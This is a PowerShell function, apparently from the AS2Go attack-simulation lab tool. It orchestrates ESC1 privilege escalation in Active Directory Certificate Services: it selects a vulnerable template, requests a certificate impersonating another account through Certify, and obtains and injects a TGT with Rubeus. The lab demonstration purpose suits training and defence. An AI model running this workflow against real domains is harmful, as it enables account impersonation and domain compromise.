<#
.SYNOPSIS
Demonstrates account impersonation through an ESC1-vulnerable AD CS template.

.DESCRIPTION
Sets the current lab stage and asks whether to run the ESC1 workflow.
Selects a vulnerable published certificate template and resolves an alternative target account.
Calls Certify to request a certificate containing the target UPN and SID, then uses Rubeus to request and inject a TGT.
Offers separate repeat prompts for certificate requests and TGT requests. Unattended mode skips this workflow.

.EXAMPLE
Invoke-PrivilegeEscalationViaESC1
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires configured vulnerable-template data, a reachable CA, Certify, and Rubeus.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Selects a published ESC1-vulnerable template and an account to impersonate through a certificate request.
Requests the certificate with Certify, then requests and injects a Kerberos TGT with Rubeus.
#>
function Invoke-PrivilegeEscalationViaESC1 {

    ################################################################################
    #####                                                                      ##### 
    #####    Exploiting Misconfigured Certificate Templates (ESC1)             #####                                  
    #####                                                                      #####
    ################################################################################

    $Info = Measure-FunctionRuntime -Begin

    Update-WindowTitle -NewTitle $Script:Phase25
    Set-ASConfig -Setting "LastStage" -Value $Script:Phase25

    Do {
        If (-not $SkipClearHost) { Clear-Host }

        Write-AS2GoOutput -Type  Header -M "Exploiting Misconfigured Certificate Templates (ESC1)"
        Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

        # http://attack.mitre.org/techniques/T1649/
        # certutil -config "ROOT-DC19-01.WS19-ROOT.CORP\WS19-ROOT" -crl "http://root-dc19-01.ws19-root.corp/certsrv/mscep_admin.crl" -verify "mscep_admin.crt"

        If ($UnAttended) {
            $answer = $Script:No
        }
        else {
            $question = "Do you want to run this attack - Y or N? Default "
            $answer = Get-Answer -question $question -defaultValue $Script:Yes
        }

        If ($answer -eq $Script:Yes) {

            If (-not $SkipClearHost) { Clear-Host }
            Write-AS2GoOutput -Type Header -Message "Step 1 - Identify Misconfigured and (!) Published Certificate Templates"
            $Functionality = "Checks for published certificate templates vulnerable to ESC1."
Write-AS2GoOutput -Type H1 -Message $Functionality  
            $CATemplate = Get-VulnerableCertificateTemplate

            Do {
                If (-not $SkipClearHost) { Clear-Host }
                
                $AlternativeAccountDN = Set-AlternativeAccount
                $AlternativeAccount = Get-ADUserDetails -SearchByDN -Identifier $AlternativeAccountDN
                
                If (-not $UnAttended) { pause }
                If (-not $SkipClearHost) { Clear-Host }
                Write-AS2GoOutput -Type Header -Message "Step 3 - Request Certificate with Certify"
                $Functionality = "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."
Write-AS2GoOutput -Type H1 -Message $Functionality
                Write-AS2GoOutput -Type  Bullet -Message "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."

                $PfxBase64 = Request-PfxWithCertify  -Certificate  $CAtemplate -AlternativeAccount $AlternativeAccount
                
                $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
                $repeat = Get-Answer -question $question -defaultValue $Script:No

            } Until ($repeat -eq $Script:No)

            Do {
                If (-not $SkipClearHost) { Clear-Host }

                Write-AS2GoOutput -Type Header -Message "Step 4 - Request a Ticket Granting Ticket (TGT) with Rubeus"
                Write-AS2GoOutput -Type  H1 -Message "Now we can request a TGT for the user for which we minted the new certificate."
                Request-TGTWithRubeus -pfxFile $PfxBase64 -AlternativeAccount $AlternativeAccount

                $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
                $repeat = Get-Answer -question $question -defaultValue $Script:No

            } Until ($repeat -eq $Script:No)

        } ##
        else {
            return
        }

        If (-not $SkipClearHost) { Clear-Host }

        Write-AS2GoOutput -Type  Header -M "??? REPEAT | Exploiting Misconfigured Certificate Templates (ESC1) ???"

    } Until ($repeat -eq $Script:No)

    Measure-FunctionRuntime -End -Details $Info
}
